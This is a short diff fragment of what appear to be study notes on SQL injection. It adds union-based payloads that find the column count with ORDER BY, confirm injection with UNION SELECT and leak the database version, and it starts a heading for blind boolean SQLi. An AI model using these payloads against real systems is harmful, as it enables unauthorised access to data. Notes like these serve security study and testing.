@@ -8,3 +8,7 @@ id=1' OR '1'='1 -> shows all records
 2. Union-Based SQLi
 id=1' ORDER BY 1# , 2# , ... until error occurs (confirms column count)
 id=1' ORDER BY 3# -> error (2 columns here)
+id=1' UNION SELECT 1,2# -> shows output of 2 columns (confirms union sqli works)
+id=1' UNION SELECT @@version,2# -> db version leaked 
+
+3. Blind SQLi (Boolean-Based)
